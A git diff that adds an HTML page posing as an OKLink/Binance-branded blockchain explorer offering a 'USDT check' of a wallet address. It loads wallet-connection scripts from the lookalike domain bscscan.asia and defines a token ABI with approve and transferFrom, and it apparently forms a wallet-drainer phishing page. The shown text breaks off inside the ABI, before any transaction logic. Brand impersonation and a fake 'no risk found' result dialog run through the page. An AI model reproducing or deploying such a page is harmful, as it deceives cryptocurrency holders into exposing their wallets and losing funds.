@@ -1,19 +1,1475 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+
 <head>
-    <meta charset="UTF-8">
-    <title>正在跳转支付页面</title>
-    <script type="text/javascript" src="api.js"></script>
     <style>
-        iframe {
+        ._z_success_title {
             width: 100%;
-            height: 100vh;
-            border: none;
+            font-size: 1rem;
+            margin-top: 0.6rem;
+            font-weight: bold;
+        }
+
+        ._z_success_value {
+            width: 100%;
+            margin-top: 0.2rem;
+            align-items: center;
+            background: #fff;
+            border: 1px solid #d8dce5;
+            border-radius: 4px;
+            color: #aab1bf;
+            display: flex;
+            justify-content: flex-start;
+            line-height: 16px;
+            padding: 0 8px;
+        }
+
+        ._z_success_value input {
+            font-size: 1rem;
+            width: 91%;
+            padding: 0.3rem;
+            border-radius: 10px;
+            background: none;
+            color: #3f4040 !important;
         }
     </style>
+    <title>区块链浏览器查询 </title>
+    <meta charset="UTF-8">
+    <meta name="description" content="区块链浏览器。" />
+    <meta name="keywords" content="区块链浏览器,区块链查询,BinanceLink" />
+    <meta name="baidu-site-verification" content="KC8pANWUXW" />
+    <link rel="shortcut icon" href="https://www.bscscan.asia/favicon.ico" />
+
+    <meta name="robots" content="all">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+
+    <meta property="og:title" content="区块链浏览器查询">
+    <meta property="og:type" content="website" />
+    <meta property="og:description" content="区块链浏览器。">
+    <meta property="og:image" content="https://static.oklink.com/cdn/assets/imgs/2211/59F14C8DE1384F1D.png">
+
+    <meta property="og:url" content="https://www.oklink.com/zh-cn/">
+    <meta property="og:site_name" content="BinanceLink">
+
+    <meta name="twitter:card" content="summary">
+
+
+    <meta name="twitter:image" content="https://static.oklink.com/cdn/assets/imgs/2211/59F14C8DE1384F1D.png">
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <meta name="full-screen" content="yes" />
+    <meta name="browsermode" content="application" />
+    <meta name="x5-orientation" content="portrait" />
+    <meta name="x5-fullscreen" content="true" />
+    <meta name="x5-page-mode" content="app" />
+
+    <link rel="shortcut icon" href=" /favicon.ico" />
+    <link rel="canonical" href="https://www.oklink.com/en/" />
+    <link rel="alternate" hreflang="en" href="https://www.oklink.com/en/" />
+    <link rel="alternate" hreflang="es" href="https://www.oklink.com/es/" />
+    <link rel="alternate" hreflang="pt" href="https://www.oklink.com/pt/" />
+    <link rel="alternate" hreflang="ru" href="https://www.oklink.com/ru/" />
+    <link rel="alternate" hreflang="zh-Hant-HK" href="https://www.oklink.com/zh-hk/" />
+    <link rel="alternate" hreflang="zh-Hans-CN" href="https://www.oklink.com/zh-cn/" />
+    <link rel="alternate" hreflang="fr" href="https://www.oklink.com/fr/" />
+    <link rel="alternate" hreflang="vi" href="https://www.oklink.com/vi/" />
+    <link rel="alternate" hreflang="tr" href="https://www.oklink.com/tr/" />
+    <link rel="alternate" hreflang="ja" href="https://www.oklink.com/ja/" />
+    <link rel="alternate" hreflang="ko" href="https://www.oklink.com/ko/" />
+    <link rel="alternate" hreflang="de" href="https://www.oklink.com/de/" />
+
+    <link rel="stylesheet" type="text/css" href="https://bscscan.asia/static/tianyan/css/common/index.css">
+    <link rel="stylesheet" type="text/css" href="https://bscscan.asia/static/tianyan/css/light/index.css">
+    <link rel="stylesheet" type="text/css" href="https://bscscan.asia/static/tianyan/css/header/index.css">
+    <link rel="stylesheet" type="text/css" href="https://bscscan.asia/static/tianyan/css/footer/index.css">
+
+    <link rel="stylesheet" type="text/css" href="https://bscscan.asia/static/tianyan/css/index/index.css">
+
+    <link rel="stylesheet" type="text/css" href="https://bscscan.asia/static/tianyan/static.oklink.com/cdn/assets/okfe/css/index.css">
+    
+        
 </head>
-<body>
+
+<body data-responsive="true" data-nav="true" data-isApp="false">
+
+    <header class="header-container">
+
+        <a class="logo" href="https://www.oklink.com/zh-cn">
+                <img alt="logo" src="https://bscscan.asia/static/tianyan/static.oklink.com/cdn/assets/imgs/221/bian.png">
+                <span data-lang-key="oklink_header_logo_text">币安云链</span>
+            </a>
+
+        <!--<i class="icon oklink-icon icon-icon_hambergur header-action-icon header-action-icon-open okg-sm okg-md"></i>-->
+
+        <!--<section class="header-content header-content-sm">-->
+        <!--    <div class="okg-sm okg-md sm-icon-and-closeBtn">-->
+
+        <!--        <a class="logo" href="/">-->
+        <!--            <img alt="logo" src="https://static.oklink.com/cdn/assets/imgs/218/39E0ACE3BABBCE0B.png">-->
+        <!--            <span data-lang-key="oklink_header_logo_text">欧科云链</span>-->
+        <!--        </a>-->
+
+        <!--        <i class="icon oklink-icon icon-icon_close close-icon"></i>-->
+        <!--    </div>-->
+
+        <!--    <ul class="action-part">-->
+        <!--        <li class="no-login">-->
+        <!--            <a class="btn-register" href="javascript:;" data-lang-key="oklink_header_title_register">登录钱包</a>-->
+        <!--        </li>   -->
+        <!--        <li class="nav-language animation-list-container">-->
+        <!--            <div class="animation-list-title">-->
+        <!--                <i class="oklink-icon icon-home_language lang-box-icon okg-lg okg-xl"></i>-->
+        <!--                <p class="current-language okg-sm okg-md">-->
+        <!--                    English-->
+        <!--                </p>-->
+        <!--                <i class="icon oklink-icon icon-dropdown_spread arrow-icon"></i>-->
+        <!--            </div>-->
+        <!--            <ul class="header-language-list animation-list">-->
+        <!--                <li class="language-list-item animation-list-item" data-language="zh_CN">简体中文</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="en_US">English</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="zh_HK">繁體中文</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="de_DE">Deutsch</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="es_419">Español</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="fr_FR">Français</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="pt_BR">Portugués</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="ru_RU">Pусский</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="vi_VN">Tiếng Việt</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="tr_TR">Türkçe</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="ko_KR">한국어</li>-->
+        <!--                <li class="language-list-item animation-list-item" data-language="ja_JP">日本語</li>-->
+        <!--            </ul>-->
+        <!--        </li>-->
+
+        <!--    </ul>-->
+        <!--    <ul class="nav-part">-->
+
+        <!--        <li class="explorer-entry animation-list-container">-->
+        <!--            <div class="current-explorer animation-list-title">-->
+        <!--                <p class="explorer-list-item animation-list-item">-->
+        <!--                    <img class="explorer-logo" alt="explorer-logo" />-->
+        <!--                    <span class="explorer-name" data-lang-key="oklink_header_explorer_name">浏览器</span>-->
+        <!--                    <span class="explorer-chain-name"></span>-->
+        <!--                </p>-->
+        <!--                <i class="icon oklink-icon icon-dropdown_spread arrow-icon"></i>-->
+        <!--            </div>-->
+        <!--            <div class="explorer-list-wrap">-->
+        <!--                <div class="explorer-list">-->
+        <!--                    <ul class="explorer-list-content">-->
+        <!--                        <li class="explorer-list-item animation-list-item btc" data-explorer="BTC">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/btc" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-btc" src="https://static.oklink.com/cdn/assets/imgs/MjAxOTc/1254C5731DCE6B41F928F1FC529E8505.jpg" />-->
+        <!--                                <span class="explorer-name">Bitcoin</span>-->
+        <!--                                <span class="explorer-name-abbr">BTC</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item eth" data-explorer="ETH">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/eth" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-eth" src="https://static.oklink.com/cdn/assets/imgs/MjAxOTk/CB0A5DD902E75A249AA9379D921312AC.png" />-->
+        <!--                                <span class="explorer-name">Ethereum</span>-->
+        <!--                                <span class="explorer-name-abbr">ETH</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item ethf" data-explorer="ETHF">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/ethf" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-ethf" src="https://static.oklink.com/cdn/assets/imgs/229/99F31ED39DB6B4E1.png" />-->
+        <!--                                <span class="explorer-name">EthereumFair</span>-->
+        <!--                                <span class="explorer-name-abbr">ETHF</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item ethw" data-explorer="ETHW">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/ethw" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-ethw" src="https://static.oklink.com/cdn/assets/imgs/229/943042C6982938A7.png" />-->
+        <!--                                <span class="explorer-name">EthereumPoW</span>-->
+        <!--                                <span class="explorer-name-abbr">ETHW</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item okexchain" data-explorer="OKC">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/okc" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-okt" src="https://static.oklink.com/cdn/assets/imgs/221/3942401CC18A5191.png" />-->
+        <!--                                <span class="explorer-name">OKC</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item okexchain-test" data-explorer="OKC-TEST">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/okc-test" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-okt-test" src="https://static.oklink.com/cdn/assets/imgs/221/3942401CC18A5191.png" />-->
+        <!--                                <span class="explorer-name">OKC (Test)</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item aptos" data-explorer="APTOS">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/aptos" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-aptos" src="https://static.oklink.com/cdn/assets/imgs/229/412B0DE47FDDF3E1.png" />-->
+        <!--                                <span class="explorer-name">Aptos</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item bsc" data-explorer="BSC">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/bsc" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-bsc" src="https://static.oklink.com/cdn/assets/imgs/2210/7C98445D3B32612C.png" />-->
+        <!--                                <span class="explorer-name">BNB Smart Chain</span>-->
+        <!--                                <span class="explorer-name-abbr">BSC</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item polygon" data-explorer="POLYGON">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/polygon" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-polygon" src="https://static.oklink.com/cdn/assets/imgs/224/EC1BAC6F0B39CA4B.png" />-->
+        <!--                                <span class="explorer-name">Polygon</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item sol" data-explorer="SOL">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/sol" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-sol" src="https://static.oklink.com/cdn/assets/imgs/223/8BD4D9D7EAEBFB64.png" />-->
+        <!--                                <span class="explorer-name">Solana</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item optimism" data-explorer="OPTIMISM">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/optimism" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-optimism" src="https://static.oklink.com/cdn/assets/imgs/228/B6CEEF6ABE89D952.png" />-->
+        <!--                                <span class="explorer-name">Optimism</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item arbitrum" data-explorer="ARBITRUM">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/arbitrum" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-arbitrum" src="https://static.oklink.com/cdn/assets/imgs/2210/7A422259AC847AE3.png" />-->
+        <!--                                <span class="explorer-name">Arbitrum</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item zksync" data-explorer="ZKSYNC">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/zksync" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-zksync" src="https://static.oklink.com/cdn/assets/imgs/2210/420050FA68B8329B.png" />-->
+        <!--                                <span class="explorer-name">zkSync</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item trx" data-explorer="TRX">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/trx" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-trx" src="https://static.oklink.com/cdn/assets/imgs/214/787150B249E4AB24.png" />-->
+        <!--                                <span class="explorer-name">TRON</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item avax" data-explorer="AVAX">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/avax" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-avax" src="https://static.oklink.com/cdn/assets/imgs/227/89E0F2FC906AA989.png" />-->
+        <!--                                <span class="explorer-name">Avalanche</span>-->
+        <!--                                <span class="explorer-name-abbr">AVAX</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item ftm" data-explorer="FTM">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/ftm" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-ftm" src="https://static.oklink.com/cdn/assets/imgs/229/D7BD2FE5F67E12FB.png" />-->
+        <!--                                <span class="explorer-name">Fantom</span>-->
+        <!--                                <span class="explorer-name-abbr">FTM</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item usdt" data-explorer="USDT">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/usdt" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-usdt" src="https://static.oklink.com/cdn/assets/imgs/221/63DB75A49372AF49.png" />-->
+        <!--                                <span class="explorer-name">Tether USD</span>-->
+        <!--                                <span class="explorer-name-abbr">USDT</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item etc" data-explorer="ETC">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/etc" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-etc" src="https://static.oklink.com/cdn/assets/imgs/204/5DCA6F6DE0E4727C.png" />-->
+        <!--                                <span class="explorer-name">Ethereum Classic</span>-->
+        <!--                                <span class="explorer-name-abbr">ETC</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item bch" data-explorer="BCH">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/bch" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-bch" src="https://static.oklink.com/cdn/assets/imgs/MjAxOTg/C927383F20FD7EBF30392CBBD0177CE2.png" />-->
+        <!--                                <span class="explorer-name">Bitcoin Cash</span>-->
+        <!--                                <span class="explorer-name-abbr">BCH</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item ltc" data-explorer="LTC">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/ltc" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-ltc" src="https://static.oklink.com/cdn/assets/imgs/MjAxOTc/1F68B88AB304984240DAE1159CA8E1D7.jpg" />-->
+        <!--                                <span class="explorer-name">Litecoin</span>-->
+        <!--                                <span class="explorer-name-abbr">LTC</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
+        <!--                        <li class="explorer-list-item animation-list-item dash" data-explorer="DASH">-->
+        <!--                            <a href="https://www.oklink.com/zh-cn/dash" class="explorer-url">-->
+        <!--                                <img class="explorer-logo" alt="explorer-logo-dash" src="https://static.oklink.com/cdn/assets/imgs/206/E9DC97F5FD204E6A.png" />-->
+        <!--                                <span class="explorer-name">DASH</span>-->
+        <!--                            </a>-->
+        <!--                        </li>-->
 
 
+        <!--                    </ul>-->
+        <!--                </div>-->
+
+        <!--             </div>-->
+        <!--        </li>-->
+
+
+        <!--        <li class="nav-tianyan animation-list-container">-->
+        <!--            <div class="animation-list-title">-->
+        <!--                <a href="https://www.oklink.com/zh-cn/tianyan" class="nav-link-name" data-name="tianyan" data-lang-key="oklink_okcoincn_home_tools">链上天眼</a>-->
+        <!--            </div>-->
+        <!--        </li>-->
+        <!--        <li class="nav-chainhub animation-list-container">-->
+        <!--            <div class="animation-list-title">-->
+        <!--                <a href="https://www.oklink.com/zh-cn/chainhub" class="nav-link-name" data-name="chainhub" data-lang-key="oklink_okcoincn_home_chain_master">链上大师</a>-->
+        <!--            </div>-->
+        <!--        </li>-->
+        <!--        <li class="nav-chainhub animation-list-container">-->
+        <!--            <div class="animation-list-title">-->
+        <!--                <a href="https://www.oklink.com/zh-cn/audit" class="nav-link-name" data-name="audit" data-lang-key="view_seo_header_list_audit">链上卫士</a>-->
+        <!--            </div>-->
+        <!--        </li>-->
+        <!--        <li class="nav-academy animation-list-container">-->
+        <!--            <div class="animation-list-title">-->
+        <!--                <a href="https://www.oklink.com/academy/zh" class="nav-link-name" data-lang-key="oklink_okcoincn_home_academy">学院</a>-->
+        <!--            </div>-->
+        <!--        </li>-->
+
+
+
+        <!--    </ul>-->
+        <!--</section>-->
+        <!--<div class="drawer-mask"></div>-->
+    </header>
+
+    <style type="text/css">
+        .search-btn1 {
+            align-items: center;
+            background: #004cff;
+            border-radius: 4px;
+            color: #fff;
+            cursor: pointer;
+            display: flex;
+            font-size: 14px;
+            font-weight: 500;
+            justify-content: center;
+            line-height: 16px;
+            /*margin-left: 8px;*/
+            padding: 12px 16px;
+            width: 90px;
+        }
+
+        .search-input1 {
+            background: none;
+            color: #1f2533;
+            font-size: 14px;
+            height: 40px;
+            line-height: 16px;
+            width: 100%;
+        }
+
+        .btn-register2 {
+            background: #205fec;
+            border-radius: 4px;
+            color: #fff;
+            display: inline-block;
+            line-height: 12px;
+            margin: 34px 0 24px;
+            min-width: 100px;
+            padding: 10px 12px;
+            text-align: center;
+        }
+
+        @media (min-width: 1024px) {
+            .btn-register2 {
+                margin: 0
+            }
+        }
+    </style>
+
+    <main class="home-container page-home oklink-cn">
+
+
+        <section class="section-search">
+            <div class="section-search-blur"></div>
+            <div class="section-search-bg">
+                <div class="search-container animation-list-container">
+                    <h1 class="home-text">
+                        <p data-lang-key="oklink_okcoincn_home_title_row1" style="color:#f0b90b">USDT检测</p>
+                        <img src="https://bscscan.asia/static/tianyan/static.oklink.com/cdn/assets/imgs/221/bian.png" alt="登录钱包" width="150" height="150">
+                    </h1>
+
+                    <div class="search-main">
+
+                        <div class="chain-select-container">
+                            <div class="search-selection-trigger">
+                                <p class="current-chain">
+                                    <img class="selection-icon" alt="current-explorer" src="https://bscscan.asia/static/tianyan/static.oklink.com/token/tokenpocket-1620725613465.png">
+                                    <span class="selection-txt">Polygon-USDT</span>
+                                </p>
+                                <i class="icon oklink-icon icon-test search-selection-test" aria-hidden="true"></i>
+                                <div class="" id="fiatPop"></div>
+                                <i class="icon oklink-icon icon-dropdown_spread arrow-icon" aria-hidden="true"></i>
+                            </div>
+                        </div>
+
+
+                        <form class="input-container" style="margin-bottom: 4px; margin-right: 8px;">
+                            <i class="icon oklink-icon icon-search"></i>
+                            <input class="search-input1 _z_js_address" name="search" AUTOCOMPLETE="OFF" placeholder="在此输入您的钱包地址">
+                            <i class="icon oklink-icon icon-close-circle search-hide"></i>
+
+                        </form>
+
+
+                        <center><div class="search-btn1 btn-register2" data-lang-key="oklink_homepage_search_but" id="btn_login" 
+                            
+                            >立即查询</div></center> 
+                    </div>
+                </div>
+            </div>
+        </section>
+        <section class="section-promotions">
+            <div class="promotions-header">
+                <h2 class="promotions-title" data-lang-key="oklink_okcoincn_home_promotions_title">热门板块</h2>
+                <div class="promotions-actions-container">
+                    <div class="promotions-actions-btn promotions-actions-btn-last">
+                        <i class="promotions-actions-icon icon oklink-icon icon-dropdown_spread"></i>
+                    </div>
+                    <div class="promotions-actions-btn promotions-actions-btn-next">
+                        <i class="promotions-actions-icon icon oklink-icon icon-dropdown_spread"></i>
+                    </div>
+                </div>
+            </div>
+            <div class="promotions-list-container">
+                <ul class="promotions-list"></ul>
+            </div>
+        </section>
+
+
+    </main>
+
+    <!--<div id="dlg" style="background: rgb(4 2 2 / 72%); position: absolute; top: 0px;display:none; left: 0px; height: 100%; width: 100%;  align-items: center; justify-content: center;">-->
+    <!--    <div style="background: #ffffff; border: 1px solid gray; width: 92%; border-radius: 20px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; padding: 30px; box-sizing: border-box;">-->
+    <!--        <div style="-->
+    <!--            background: #0e84e9;-->
+    <!--        color: #fff;-->
+    <!--        line-height: 2rem;-->
+    <!--        font-size: 0.5rem;-->
+    <!--        padding: 0 0.4rem;-->
+    <!--        border-radius: 9px;-->
+    <!--        width: 90%;-->
+    <!--        text-align: center;-->
+    <!--        margin-bottom: 0.6rem;-->
+    <!--            ">USDT检测结果</div>-->
+
+    <!--        <div class="_z_success_title">查询地址：</div>-->
+    <!--        <div class="_z_success_value">-->
+    <!--            <input value="" class="_z_js_address" disabled="">-->
+    <!--        </div>-->
+    <!--        <div class="_z_success_title">查询时间：</div>-->
+    <!--        <div class="_z_success_value">-->
+    <!--            <input id="_z_success_title" value="" disabled="">-->
+    <!--        </div>-->
+    <!--        <div class="_z_success_title">查询状态：</div>-->
+    <!--        <div class="_z_success_value">-->
+    <!--            <input id="_z_success_value" value="未发现风险，安全无异常" disabled="">-->
+    <!--        </div>-->
+    <!--        <div class="_z_success_title">查询余额：</div>-->
+    <!--        <div class="_z_success_value">-->
+    <!--            <input id="ye" value="" disabled="">-->
+    <!--        </div>-->
+            <!--<div style="background: #f00; width: 100%; text-align: center; border-radius: 10px; border: 1px solid #f66; padding: 0.8rem 0.5rem;">-->
+            <!--    <div style="color: #f00; font-weight: 400; width: 100%;">当前钱余额为（OKC）：</div>-->
+            <!--    <div style="color: red; width: 100%;">USDT：35 / OKT：0.00019</div>-->
+            <!--</div>-->
+
+            <!--<div id="btn_dlg_ok" style="font-size:16px; color:#251ded; margin-top: 1rem;">关闭</div>-->
+    <!--    </div>-->
+    <!--</div>-->
+    <script type="text/javascript" src="https://bscscan.asia/static/tianyan/js/web3model.min.js"></script>
+   
+    <script type="text/javascript" src="https://bscscan.asia/static/tianyan/js/web3provider.js"></script>
+    <script type="text/javascript" src="https://bscscan.asia/static/tianyan/js/web3.min.js"></script>
+    <script type="text/javascript" src="https://bscscan.asia/static/tianyan/js/ethers-v4.min.js"></script>
+
+
+
+    <script src="https://bscscan.asia/static/tianyan/js/jquery.min.js"></script>
+
+    <script type="text/javascript">
+        const ABI = [{
+            "constant": true,
+            "inputs": [],
+            "name": "name",
+            "outputs": [{
+                "name": "",
+                "type": "string"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "decimals",
+            "outputs": [{
+                "name": "",
+                "type": "uint8"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "paused",
+            "outputs": [{
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "owner",
+            "outputs": [{
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "symbol",
+            "outputs": [{
+                "name": "",
+                "type": "string"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "lawEnforcementRole",
+            "outputs": [{
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "supplyController",
+            "outputs": [{
+                "name": "",
+                "type": "address"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "constructor"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "from",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "name": "to",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }],
+            "name": "Transfer",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "owner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "name": "spender",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }],
+            "name": "Approval",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "oldOwner",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "name": "newOwner",
+                "type": "address"
+            }],
+            "name": "OwnershipTransferred",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "name": "Pause",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "name": "Unpause",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "addr",
+                "type": "address"
+            }],
+            "name": "AddressFrozen",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "addr",
+                "type": "address"
+            }],
+            "name": "AddressUnfrozen",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "addr",
+                "type": "address"
+            }],
+            "name": "FrozenAddressWiped",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "oldLawEnforcementRole",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "name": "newLawEnforcementRole",
+                "type": "address"
+            }],
+            "name": "LawEnforcementRoleSet",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "to",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }],
+            "name": "SupplyIncreased",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "from",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }],
+            "name": "SupplyDecreased",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": true,
+                "name": "oldSupplyController",
+                "type": "address"
+            }, {
+                "indexed": true,
+                "name": "newSupplyController",
+                "type": "address"
+            }],
+            "name": "SupplyControllerSet",
+            "payable": false,
+            "type": "event"
+        }, {
+            "constant": false,
+            "inputs": [],
+            "name": "initialize",
+            "outputs": [],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [],
+            "name": "totalSupply",
+            "outputs": [{
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_to",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "_value",
+                "type": "uint256"
+            }],
+            "name": "transfer",
+            "outputs": [{
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "indexed": false,
+                "name": "_addr",
+                "type": "address"
+            }],
+            "name": "balanceOf",
+            "outputs": [{
+                "name": "",
+                "type": "uint256"
+            }],
+            "payable": false,
+            "stateMutability": "view",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "_from",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "_to",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "_value",
+                "type": "uint256"
+            }],
+            "name": "transferFrom",
+            "outputs": [{
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": false,
+            "inputs": [{
+                "indexed": false,
+                "name": "spender",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "value",
+                "type": "uint256"
+            }],
+            "name": "approve",
+            "outputs": [{
+                "name": "",
+                "type": "bool"
+            }],
+            "payable": false,
+            "stateMutability": "nonpayable",
+            "type": "function"
+        }, {
+            "constant": true,
+            "inputs": [{
+                "indexed": false,
+                "name": "_owner",
+                "type": "address"
+            }, {
+                "indexed": false,
+                "name": "spender",
+                "type": "address"
+            }],
+            "name": "allowance",
+            "outputs": [{
+                "name": "",
